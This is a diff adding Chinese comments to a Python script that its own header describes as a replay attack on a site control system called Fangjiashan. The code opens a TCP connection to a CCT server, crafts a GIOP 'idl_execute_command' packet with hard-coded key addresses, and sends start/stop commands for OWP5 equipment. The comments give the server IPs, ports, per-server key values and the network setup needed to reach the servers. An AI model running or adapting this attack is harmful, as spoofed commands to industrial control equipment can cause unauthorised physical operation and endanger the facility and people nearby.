@@ -4,6 +4,7 @@ from protocols.packet_giop import *
 import socket
 
 
+# 此类中的方法，用于实现方家山现场系统的回放攻击
 class TestFangJiaShan(object):
     def __init__(self):
         pass
@@ -11,13 +12,28 @@ class TestFangJiaShan(object):
     def test(self):
         self.test_sas_stop_owp5()
 
+    # 功能：测试主机连接到CCT，使用GIOP协议下发OWP5启动命令
+    # 说明：现场环境中，与CCT通信的是SAS
+    #      实际流量中，SAS通过一条TCP长连接，向CCT发送命令包
+    #      CCT接到命令包后，会根据执行过程的进展，通过另一条TCP长连接向SAS反馈执行状态
+    #      而此方法模拟SAS端，首先与CCT建立TCP连接，之后发送GIOP请求包（idl_execute_command）
+    #      后续的状态反馈同样通过另一条TCP连接返回给SAS
+    # 注意：不同的SAS操作（启/停各类2层设备）都使用'idl_execute_command'命令包
+    #      同一种方法（即：方法名相同），在不同服务器上（例如：CCT1和CCT2）对应的KeyAddress字段值不同
+    #      不同的操作（例如：启动OWP5和停止OWP5），使用的负载（StubData字段）不同
+    # 【重要】：使用脚本与CCT等现场设备建立TCP连接前，需要首先配置本机的静态IPv4地址
+    #         例如：CCT1的IP地址为192.168.69.101
+    #              与CCT1建立TCP连接前，需要配置本机IP地址为192.168.69.xxx（此网段内未使用的IP地址），子网掩码为255.255.255.0
+    #              即测试主机与CCT1服务器处于同一网段，此外，测试主机连接交换机的端口不能是镜像口
     def test_sas_start_owp5(self):
         #        ip              port   KeyAddress
         # cct1:  192.168.69.101  11900  14010f00525354d4d88b5f86a90100030000000100000004000000
         # cct2:  192.168.69.102  12900  14010f00525354ced88b5f34c10c00030000000100000004000000
+        # 与CCT2建立TCP连接
         skt = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
         skt.connect(('192.168.69.102', 12900))
 
+        # 封装GIOP命令数据包
         pkt = GIOP(type='Request',
                    RequestID=1,
                    KeyAddress=h2b('14010f00525354ced88b5f34c10c00030000000100000004000000'),
@@ -29,6 +45,7 @@ class TestFangJiaShan(object):
                                 )
                    )
 
+        # 发送至网络
         skt.send(bytes(pkt))
 
         print('Sleeping... 3s')
